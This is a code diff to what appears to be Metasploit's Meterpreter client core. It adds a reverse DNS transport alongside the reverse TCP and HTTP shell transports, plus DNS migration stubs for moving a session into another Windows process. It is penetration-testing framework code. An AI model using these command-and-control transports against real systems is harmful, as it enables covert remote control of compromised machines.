@@ -38,7 +38,8 @@ class ClientCore < Extension
     'reverse_tcp',
     'reverse_http',
     'reverse_https',
-    'bind_tcp'
+    'bind_tcp',
+    'reverse_dns'
   ]
 
   include Rex::Payloads::Meterpreter::UriChecksum
@@ -581,7 +582,6 @@ class ClientCore < Extension
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
-
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
     end
@@ -734,9 +734,7 @@ private
 
     if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
       t = get_current_transport
-
       c = Class.new(::Msf::Payload)
-
       if target_process['arch'] == ARCH_X86
         c.include(::Msf::Payload::Windows::BlockApi)
         case t[:url]
@@ -747,6 +745,9 @@ private
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
+        when /^dns/i
+          # Covers reverse DNS
+          c.include(::Msf::Payload::Windows::MigrateDns)  
         end
       else
         c.include(::Msf::Payload::Windows::BlockApi_x64)
@@ -758,14 +759,15 @@ private
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
+        when /^dns/i
+          # Covers reverse DNS
+          c.include(::Msf::Payload::Windows::MigrateDns_x64)
         end
       end
-
       stub = c.new().generate
     else
       raise RuntimeError, "Unsupported session #{client.session_type}"
     end
-
     stub
   end
 
